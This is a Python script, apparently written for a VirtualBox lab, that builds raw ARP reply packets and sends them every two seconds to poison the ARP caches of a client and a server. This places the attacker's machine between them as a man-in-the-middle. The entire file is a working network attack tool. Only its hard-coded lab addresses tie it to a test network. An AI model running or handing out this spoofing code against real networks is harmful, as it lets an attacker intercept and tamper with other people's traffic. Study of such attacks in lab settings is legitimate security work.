import socket
import struct
import time
import binascii

def get_mac_address(ifname):
    """Get the MAC address of the interface."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = socket.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes(ifname[:15], 'utf-8')))
    return ':'.join(['%02x' % b for b in info[18:24]])

def craft_arp_packet(attacker_mac, src_ip, target_ip, target_mac, op=2):
    """Craft an ARP reply packet."""
    # Ethernet header
    eth_dst = binascii.unhexlify(target_mac.replace(':', ''))  # Target MAC
    eth_src = binascii.unhexlify(attacker_mac.replace(':', ''))  # Attacker MAC
    eth_type = 0x0806  # ARP
    eth_header = struct.pack('!6s6sH', eth_dst, eth_src, eth_type)

    # ARP header
    htype = 1  # Ethernet
    ptype = 0x0800  # IPv4
    hlen = 6  # MAC length
    plen = 4  # IP length
    operation = op
    src_mac = eth_src
    src_ip = socket.inet_aton(src_ip)
    dst_mac = eth_dst
    dst_ip = socket.inet_aton(target_ip)
    arp_header = struct.pack('!HHBBH6s4s6s4s', htype, ptype, hlen, plen, operation,
                             src_mac, src_ip, dst_mac, dst_ip)

    return eth_header + arp_header

def main():
    # Network details from VirtualBox lab setup
    client_ip = "192.168.56.10"
    server_ip = "192.168.56.20"
    attacker_mac = "08:00:27:72:bb:c8"  # Attacker VM MAC (this VM)
    client_mac = "08:00:27:55:b2:75"   # Client VM MAC
    server_mac = "08:00:27:e4:77:ab"   # Server VM MAC

    # Create raw socket
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind(("enp0s3", 0))  # VirtualBox VM interface name

    print("Starting ARP poisoning...")
    while True:
        # Poison Client (tell Client that Server IP is at Attacker MAC)
        packet = craft_arp_packet(attacker_mac, server_ip, client_ip, client_mac)
        sock.send(packet)

        # Poison Server (tell Server that Client IP is at Attacker MAC)
        packet = craft_arp_packet(attacker_mac, client_ip, server_ip, server_mac)
        sock.send(packet)

        print("Sent ARP packets")
        time.sleep(2)  # Send every 2 seconds to maintain poisoning

if __name__ == "__main__":
    main()